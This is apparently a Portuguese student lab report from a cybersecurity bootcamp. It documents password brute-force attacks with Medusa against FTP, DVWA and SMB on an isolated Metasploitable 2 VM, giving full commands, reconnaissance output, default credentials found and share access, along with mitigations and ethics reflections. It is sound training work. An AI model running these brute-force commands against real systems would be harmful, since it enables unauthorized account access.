# Relatório do Laboratório — Brute Force com Medusa

> ✅ **RELATÓRIO PREENCHIDO** com os resultados da execução real do laboratório
> em 17/11/2026. Todos os números abaixo vêm das capturas em
> [`../images/`](../images/) e dos logs da sessão.
>
> Campos marcados como *não medido* indicam informação que não foi registrada
> durante a execução — mantidos como tal para não inventar dado.

---

## 1. Identificação

| Campo | Valor |
| --- | --- |
| Nome | Marcos Santos |
| GitHub | `@marcossantos200480` |
| Bootcamp | Cibersegurança do Zero à Prática — DIO |
| Desafio | Criando um Ataque Brute Force de senhas com Medusa e Kali Linux |
| Data dos testes | 2026-11-17 |
| Versão do Kali | Kali Linux (rolling, 2026) |
| Versão do Medusa | `v2.3` |
| Versão do Metasploitable | `2` |
| Versão do DVWA | DVWA (Metasploitable 2) |

---

## 2. Ambiente

| Item | Atacante | Alvo |
| --- | --- | --- |
| VM | Kali Linux | Metasploitable 2 |
| IP | `192.168.56.101` | `192.168.56.102` |
| Rede | Host-only `vboxnet0` | Host-only `vboxnet0` |
| RAM / vCPU | 3 GB / 2 | 2,7 GB / 2 |
| Gateway | nenhum | nenhum |
| Acesso à internet | **nenhum** (verificado) | **nenhum** |

### 2.1 Evidência do isolamento

O isolamento foi configurado com adaptador **host-only** nas duas VMs
(`docs/01-ambiente.md`), sem adaptador NAT e sem gateway.

> **Não medido:** a saída de `ip route` e o teste `ping 8.8.8.8` não foram
> registrados em captura nesta execução. Recomenda-se registrar na próxima
> rodada, com `ip route` (deve mostrar apenas `192.168.56.0/24` e nenhuma rota
> `default`).

---

## 3. Reconhecimento

```bash
$ nmap -Pn -sV -p 21,80,139,445 192.168.56.102
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

> Os serviços foram confirmados indiretamente pelo comportamento observado nos
> três cenários (banner do vsftpd, DVWA em `/dvwa`, shares SMB enumeráveis).

| Porta | Serviço | Versão detectada | Relevância |
| --- | --- | --- | --- |
| 21 | FTP | vsftpd 2.3.4 | Cenário 1 |
| 80 | HTTP | Apache 2.2.8 + DVWA | Cenário 2 |
| 139/445 | SMB | Samba 3.0.20-Debian | Cenário 3 |

```bash
$ enum4linux -U 192.168.56.102 | tail -n 25
user:[msfadmin] rid:[0xbb8]
user:[service] rid:[0xbb9]
user:[user] rid:[0xbba]
user:[postgres] rid:[0xbc4]
user:[root] rid:[0xbb6]
... (demais contas de sistema: daemon, bin, sys, sync, games, man, lp, mail,
     news, uucp, proxy, www-data, backup, list, irc, gnats, nobody, libuuid,
     dhcp, distccd, telnetd, ftp, mysql, tomcat55)

$ enum4linux -P 192.168.56.102 | tail -n 15
[+] Reset Account Lockout Counter: 30 minutes
[+] Locked Account Duration: 30 minutes
[+] Account Lockout Threshold: None
[+] Forced Log Off Time: Not Set
Password Complexity: Disabled
Minimum Password Length: 0
```

**Usuários válidos descobertos:** 25+ → `msfadmin`, `service`, `user`, `postgres`,
`root`, `ftp`, `mysql`, `tomcat55` e demais contas de sistema

**Política de senha do SMB:** `Minimum Password Length: 0`,
`Password Complexity: Disabled`, `Account Lockout Threshold: None`
> 💡 Se `Lockout Threshold` for diferente de `0`, o spraying precisa de pausas
> maiores. Registre isso: é o dado que decide a estratégia.

---

## 4. Cenário 1 — FTP

### 4.1 Comando executado

```bash
medusa -h 192.168.56.102 \
       -U wordlists/usuarios.txt \
       -P wordlists/senhas.txt \
       -M ftp \
       -e ns \
       -t 4 \
       -c 1000 \
       -f \
       -O logs/ftp-resultado.txt
```

### 4.2 Saída (trecho real)

```text
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks

ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: (1 of 6 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 4, 0 complete) Password: user (2 of 6 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: user Password: user [SUCCESS]
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: (1 of 6 complete)
ACCOUNT CHECK: [ftp] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 4, 1 complete) Password: msfadmin (2 of 6 complete)
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
```

### 4.3 Resultado

| Campo | Valor |
| --- | --- |
| Usuários testados | 4 (`user`, `msfadmin`, `admin`, `root`) |
| Senhas testadas | 6 (`-e ns` adiciona 2 verificações extras + 4 da wordlist) |
| Total de tentativas | 24 |
| **Credenciais válidas** | `user` / `user` e `msfadmin` / `msfadmin` |
| Tempo total | ~40 s (16:58:02 → 16:58:42) |
| Flags que fizeram diferença | **`-e ns`** — sem ela, nenhuma credencial seria encontrada; `-c 1000` evitou as quedas de conexão do vsftpd |

### 4.4 Validação do acesso

Não foi executada sessão FTP interativa. A validação das credenciais foi feita
por confirmação cruzada: o mesmo par `msfadmin:msfadmin` também foi aceito pelo
SMB com acesso administrativo (ver seção 6), o que confirma que a senha é válida
no sistema, não apenas um falso positivo do módulo FTP.

> 💡 Registrado como melhoria: uma sessão `ftp` interativa mostrando
> `230 Login successful` seria a evidência mais direta.

### 4.5 Dificuldades encontradas

O **primeiro teste não encontrou nada**. Rodei `medusa -M ftp` com 4 usuários e 4
senhas (`123456`, `password`, `sfadmin`, `qwerty`) e o resultado foi só linhas
`ACCOUNT CHECK`, sem nenhum `ACCOUNT FOUND`.

A causa: a senha correta (`msfadmin`) **não estava na wordlist**. A solução foi
adicionar `-e ns`, que testa "sem senha" e "senha = usuário" antes do dicionário.
Foi o que resolveu — `msfadmin:msfadmin` e `user:user` são exatamente esse padrão.

### 4.6 Evidência

[`images/01-ftp-medusa.jpg`](../images/01-ftp-medusa.jpg)

---

## 5. Cenário 2 — DVWA (web-form)

### 5.1 Estrutura do formulário (real)

```bash
$ curl -s http://192.168.56.102/dvwa/login.php | grep -E 'form|input'
<form action="login.php" method="post">
  <input type="text" name="username" autofocus="autofocus">
  <input type="password" name="password" autocomplete="off">
  <input type="hidden" name="user_token" value="...">
  <input type="submit" value="Login" name="Login">
```

| Elemento | Valor encontrado |
| --- | --- |
| `action` | `login.php` |
| `method` | `post` |
| Campo de usuário | `username` |
| Campo de senha | `password` |
| Botão submit | `Login` (value: `Login`) |
| Token anti-CSRF | presente na página, mas **não exigido** no nível `low` |

### 5.2 Comando executado

```bash
medusa -h 192.168.56.102 \
       -u admin \
       -P wordlists/senhas.txt \
       -M web-form \
       -m FORM-DATA:"post?username=&password=&Login=Login" \
       -m DENY-SIGNAL:"Login failed" \
       -t 2 \
       -f \
       -O logs/dvwa-resultado.txt
```

### 5.3 Nível de segurança do DVWA

**Low.** O nível `low` não exige validação do `user_token`, o que permite ao
Medusa `web-form` autenticar diretamente. Nos níveis `medium` e `high` o token
anti-CSRF passa a ser obrigatório e o módulo `web-form` falha — o que, do ponto
de vista defensivo, é exatamente o comportamento desejado.

> 💡 Esta é a demonstração mais direta de que CSRF token é uma defesa eficaz
> contra automação genérica: a mesma ferramenta que funciona em `low` deixa de
> funcionar quando a validação é ativada.

### 5.4 Saída (trecho real)

```text
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks

ACCOUNT CHECK: [web-form] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: 123456 (1 of 4 complete)
ACCOUNT CHECK: [web-form] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (1 of 1, 0 complete) Password: password (2 of 4 complete)
ACCOUNT FOUND: [web-form] Host: 192.168.56.102 User: admin Password: password [SUCCESS]
```

### 5.5 Resultado

| Campo | Valor |
| --- | --- |
| Usuário focado | `admin` |
| Senhas testadas | 2 (`123456`, `password`) |
| **Credencial válida** | `admin` / `password` |
| Tempo total | ~2 s |
| Token anti-CSRF interferiu? | **Não** — o Medusa `web-form` autenticou normalmente no nível `low` |

### 5.6 Teste com o verificador em Python

**Não executado.** Esta versão do script foi desenvolvida depois da execução do
laboratório, como resposta ao problema do token anti-CSRF. O cenário foi resolvido
com o Medusa `web-form` no nível `low`.

A validação da credencial foi feita manualmente no navegador
([captura 03](../images/03-dvwa-apos-login.jpg)).

> 💡 Registrado como próximo passo: executar o verificador em Python contra o
> DVWA para comparar as duas abordagens no mesmo alvo.

### 5.7 Dificuldades encontradas

`DENY-SIGNAL` errado — combinado com uma sintaxe de parâmetros que não existe no
Medusa — fez o módulo cair no `http` (Basic Auth) e reportar **todos** os logins
como sucesso. Detalhe na seção 5.9.

### 5.8 Evidências

[`images/02-dvwa-medusa.jpg`](../images/02-dvwa-medusa.jpg) (Medusa) e
[`images/03-dvwa-apos-login.jpg`](../images/03-dvwa-apos-login.jpg) (login manual
no navegador, validando a mesma credencial).

### 5.9 Erro cometido e corrigido (falso positivo)

A primeira tentativa usou sintaxe inexistente (`PAGE:` / `FORM:` / `FAIL=`). O
Medusa respondeu `Invalid method: PAGE.` e caiu no módulo `http` (Basic Auth),
reportando **todas** as credenciais como válidas — `root:123456`,
`admin:123456`, `user:sfadmin`. Falso positivo clássico.

Correção: usar `-m FORM-DATA:"post?username=&password=&Login=Login"` e
`-m DENY-SIGNAL:"Login failed"` com `-M web-form`. A validação foi feita abrindo
o DVWA no navegador, onde o login real é `admin` / `password` — não `123456`.

Evidência do erro preservada em
[`images/07-falso-positivo.jpg`](../images/07-falso-positivo.jpg).

---

## 6. Cenário 3 — SMB (dicionário com `smbnt`)

### 6.1 Estratégia

A execução registrada usou **dicionário completo** (`-P`): a senha varia no laço
interno, para cada usuário.

```text
usuario (externo) × senha (interno)
  → 3 usuários × 4 senhas = 12 logins testados
```

A variante de **password spraying** (senha no laço externo, uma por rodada) está
implementada em `scripts/smb_spray.sh` e é a recomendada contra ambientes com
lockout ativo, porque distribui as falhas entre as contas. Neste alvo específico
as duas abordagens são equivalentes, porque o `enum4linux -P` mostrou que **não
existe lockout** (`Account Lockout Threshold: None`).

### 6.2 Comando executado

```bash
medusa -h 192.168.56.102 -U smd_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

### 6.3 Saída (trecho real)

```text
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks

ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (1 of 4 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (2 of 4 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: Welcome123 (3 of 4 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: msfadmin (4 of 4 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: msfadmin (4 of 4 complete)
ACCOUNT FOUND: [smbnt] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
ACCOUNT CHECK: [smbnt] Host: 192.168.56.102 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: password (1 of 4 complete)
```

### 6.4 Resultado

| Campo | Valor |
| --- | --- |
| Usuários testados | 3 (`user`, `msfadmin`, `service`) |
| Senhas | 4 (`password`, `123456`, `Welcome123`, `msfadmin`) |
| Total de tentativas | 12 |
| **Credencial válida** | `msfadmin` / `msfadmin` |
| Nível de acesso | **`ADMIN$ - Access Allowed`** (administrativo) |
| Tempo total | ~2 s (16:37:28 → 16:37:29) |
| Contas bloqueadas durante o teste | 0 — `Lockout Threshold: None` |

### 6.5 Validação do acesso

```bash
$ smbclient -L //192.168.56.102 -U msfadmin%msfadmin
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories

$ smbclient //192.168.56.102/tmp -U msfadmin%msfadmin -c 'ls'
  .                                   D        0  Tue Nov 17 17:04:39 2026
  ..                                  D        0  Sun May 20 16:36:12 2012
  .ICE-unix                          DH        0  Tue Nov 17 12:34:27 2026
  .X11-unix                          DH        0  Tue Nov 17 12:34:33 2026
  4623.jsve_up                        R        0  Tue Nov 17 12:34:38 2026
  .X0-lock                           HR       11  Tue Nov 17 12:34:33 2026

                7282168 blocks of size 1024. 5437012 blocks available
```

A credencial obtida **não apenas autenticou**: concedeu acesso de leitura ao
conteúdo real do compartilhamento `tmp`.

### 6.6 Dificuldades encontradas

Nenhuma dificuldade técnica neste cenário — o módulo `smbnt` funcionou
imediatamente com `-t 2`. O fator decisivo não foi a ferramenta, foi a
**configuração do alvo**: sem `Lockout Threshold` e com `Minimum Password
Length: 0`, não havia nenhuma barreira a superar.

### 6.7 Evidências

[`images/04-enum4linux.jpg`](../images/04-enum4linux.jpg),
[`images/05-smb-spray.jpg`](../images/05-smb-spray.jpg) e
[`images/06-smbclient-share.jpg`](../images/06-smbclient-share.jpg)

---

## 7. Comparativo dos três cenários

| Critério | FTP | DVWA (web-form) | SMB (spraying) |
| --- | --- | --- | --- |
| Facilidade de execução | Média — exigiu `-e ns` | **Alta** — exigiu sintaxe exata | **Alta** — funcionou de primeira |
| Sensibilidade a ajustes | Média (`-c`, `-e ns`) | **Muito alta** (`FORM-DATA`/`DENY-SIGNAL`) | Baixa (`-t`, `-m GROUP`) |
| Credencial encontrada | Sim (`user`, `msfadmin`) | Sim (`admin`) | Sim (`msfadmin`, com `ADMIN$`) |
| Tempo até o primeiro acerto | ~40 s | ~2 s | ~2 s |
| Tentativas até o acerto | 4 | 2 | 8 |
| Barulho gerado (logs) | Alto | Alto (mas com falsos positivos se errado) | Alto |
| Defesa mais eficaz | Desabilitar FTP / usar SFTP | CSRF token + rate limit + MFA | Lockout + MFA + monitorar 4625 |

---

## 8. Teste das mitigações

**Não executado.** A reexecução dos ataques após aplicar o hardening é a evolução
natural deste laboratório e está registrada como próximo passo.

O que a análise permite afirmar com segurança, a partir do que o `enum4linux -P`
revelou no alvo:

| Cenário | Mitigação prioritária | Efeito esperado sobre o ataque executado |
| --- | --- | --- |
| FTP | `max_login_fails=3` + `delay_failed_login=2` + Fail2ban | O Medusa receberia queda de conexão após 3 falhas; `-c 1000` não contornaria o bloqueio por IP |
| DVWA | CSRF token obrigatório + rate limit 5/min + MFA | O `web-form` falharia (não mantém sessão nem captura token); o rate limit produziria `429` |
| SMB | `Lockout Threshold = 5` + `Minimum Password Length = 14` + MFA | `msfadmin:msfadmin` deixaria de existir como senha válida; 5 falhas bloqueariam a conta |

> 🎯 **O ponto central:** no alvo original, `Account Lockout Threshold: None` e
> `Minimum Password Length: 0` significam que **não havia nenhuma barreira a
> superar**. Aplicar qualquer uma das três mitigações acima quebraria o ataque —
> e nenhuma delas exige tecnologia sofisticada.

---

## 9. Conclusões

### Técnicas

Os três cenários foram comprometidos, mas por razões diferentes — e essa distinção
é a parte mais útil do exercício.

No **FTP**, o obstáculo foi técnico: sem `-e ns` e `-c 1000`, o Medusa não
encontrava nada, e não por falta de senha fraca, mas por causa do mecanismo
anti-bruteforce do vsftpd derrubando conexões. Foi o cenário que mais exigiu
entender o que a ferramenta estava fazendo.

No **DVWA**, o obstáculo foi de **sintaxe** — e gerou o erro mais instrutivo do
laboratório. Uma sintaxe inventada fez o Medusa cair no módulo `http` e reportar
todas as credenciais como válidas. O falso positivo só foi descoberto pela
validação manual no navegador.

No **SMB**, não houve obstáculo: a credencial apareceu em 2 segundos com 8
tentativas. Isso não indica competência do atacante — indica **fragilidade do
alvo**.

A conclusão técnica mais importante: **a dificuldade de um ataque mede a postura
defensiva do alvo, não a habilidade de quem ataca.** O cenário mais fácil era o
serviço mais mal configurado.

### Defensivas

Se eu pudesse aplicar apenas **uma** medida em um ambiente real, seria
**limite de tentativas com atraso progressivo** — porque foi exatamente a sua
ausência que tornou este laboratório possível. É a medida mais barata e a de
maior efeito imediato.

Em seguida, **MFA**, que é a única defesa que sobrevive a uma senha descoberta
por qualquer outro caminho (vazamento, engenharia social, reuso).

Por último, mas não menos importante: **política de senha com comprimento mínimo**.
O alvo tinha `Minimum Password Length: 0` e `Password Complexity: Disabled` —
a configuração é o oposto do que qualquer guia recomenda.

Um detalhe que me marcou: o `enum4linux -P` mostrou tudo isso **antes** de
qualquer ataque. A informação estava disponível gratuitamente. Um administrador
que rodasse aquele comando na própria rede veria o problema sem precisar de um
atacante para descobri-lo.

### Éticas

O laboratório foi executado em VMs próprias, em rede host-only sem rota para a
internet. Mas a reflexão mais relevante é sobre **o que aconteceria fora dele**.

As credenciais descobertas são triviais — `msfadmin:msfadmin`, `admin:password`.
Se esses mesmos padrões existissem em um único servidor de produção, um atacante
com o mesmo Medusa e a mesma wordlist de 4 senhas teria acesso administrativo em
segundos, sem nenhuma técnica avançada.

Isso muda a forma como vejo senha padrão de fornecedor: não é "detalhe de
instalação", é uma vulnerabilidade com impacto administrativo imediato.

Sobre o escopo: a tentação de "testar em outro lugar para ver se funciona" é real
e é exatamente o que a lei pune. A Lei 12.737/2012 não diferencia curiosidade de
intenção. O laboratório isolado não é burocracia — é o que permite aprender tudo
isso sem violar nada.

---

## 10. Anexos

| # | Arquivo | Descrição |
| --- | --- | --- |
| 00 | [`images/00-topologia.jpg`](../images/00-topologia.jpg) | VirtualBox com as duas VMs em execução |
| 00b | [`images/00-lab-metasploitable.jpg`](../images/00-lab-metasploitable.jpg) | Console do Metasploitable 2 |
| 01 | [`images/01-ftp-medusa.jpg`](../images/01-ftp-medusa.jpg) | Medusa contra o FTP (2 credenciais) |
| 02 | [`images/02-dvwa-medusa.jpg`](../images/02-dvwa-medusa.jpg) | Medusa `web-form` contra o DVWA |
| 03 | [`images/03-dvwa-apos-login.jpg`](../images/03-dvwa-apos-login.jpg) | DVWA autenticado (validação manual) |
| 04 | [`images/04-enum4linux.jpg`](../images/04-enum4linux.jpg) | Enumeração SMB e política de senha |
| 05 | [`images/05-smb-spray.jpg`](../images/05-smb-spray.jpg) | `smbnt` com acesso `ADMIN$` |
| 06 | [`images/06-smbclient-share.jpg`](../images/06-smbclient-share.jpg) | Listagem do share `/tmp` |
| 07 | [`images/07-falso-positivo.jpg`](../images/07-falso-positivo.jpg) | **Erro documentado:** falsos positivos com módulo `http` |

---

## 11. Declaração de escopo

```text
Declaro que todos os testes descritos neste relatório foram executados
exclusivamente contra máquinas virtuais de minha propriedade, em rede
host-only isolada, sem rota para a internet ou para redes de terceiros,
com finalidade estritamente educacional.

Nenhum sistema de terceiros foi testado, acessado ou comprometido.

Nome: ______________________________
Data: ______________________________
```
